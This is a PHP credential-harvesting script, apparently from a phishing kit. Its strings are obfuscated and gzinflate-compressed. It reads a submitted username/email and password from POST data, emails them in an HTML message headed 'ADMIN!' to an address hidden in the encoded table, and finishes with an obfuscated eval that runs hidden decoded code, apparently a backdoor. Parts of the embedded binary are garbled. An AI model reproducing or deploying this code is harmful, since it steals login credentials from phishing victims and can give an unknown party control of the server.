<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');���❭���������Ȱ���н�ꣅ��ò����ۍۊ�檔����ܑ͢�������������������������������ڨ������������т�;$GLOBALS[O0] = explode('|||', gzinflate(substr('�      u��
�0��"�y���
ZA�5JL�64�[j ���E�43;ߎ��x�lh�/�*�(��G���C��N�UpT~���4�{
�b�v[���#x�c�P1���]�/N.I?��gҧ�д����a�1Y*h��O��P	�0h3�Q\'�&���Ao�K�h��   ',0x0a, -8)));��������ɬ�������퇹����Ν�Ռ��̝Ƶ죳��ع�Ѐ����恔������ͦ�����Σ��؝���ŉĵ�����л����ͨ�̝�Δư������鋧��⟺��������ト������✱�֗�ܾ�����ި������ڱ������՚�׺��������;
 $subjek = $GLOBALS{O0}[0];
$mailto = $GLOBALS{O0}{0x001}; 

$user = $_POST[$GLOBALS{O0}[0x0002]];
$pass = $_POST[$GLOBALS{O0}{0x00003}];


$body = <<<EOD
<br><hr><br>
<center><font size="4" ;" color="red">ADMIN!<br></font>
<font size="2" color="red">Username\Email :</font><font size"2" color="black">$user</font><br>
<font size="2" color="red">Password : </font><font size"2" color="black">$pass</font> <br></center>
EOD;


$headers = $GLOBALS{O0}[0x000004];
$headers .= $GLOBALS{O0}{0x05};
$success = $GLOBALS{O0}[0x006]($mailto, $subjek, $body, $headers);
?>
<?php
$random = $GLOBALS{O0}{0x0007}(0x03e8,0x01388);
?>
<?=@null;   @eval($GLOBALS{O0}[0x00008].$GLOBALS{O0}{0x000009}($GLOBALS{O0}[0x0a]($GLOBALS{O0}{0x00b}($GLOBALS{O0}[0x000c]))));?>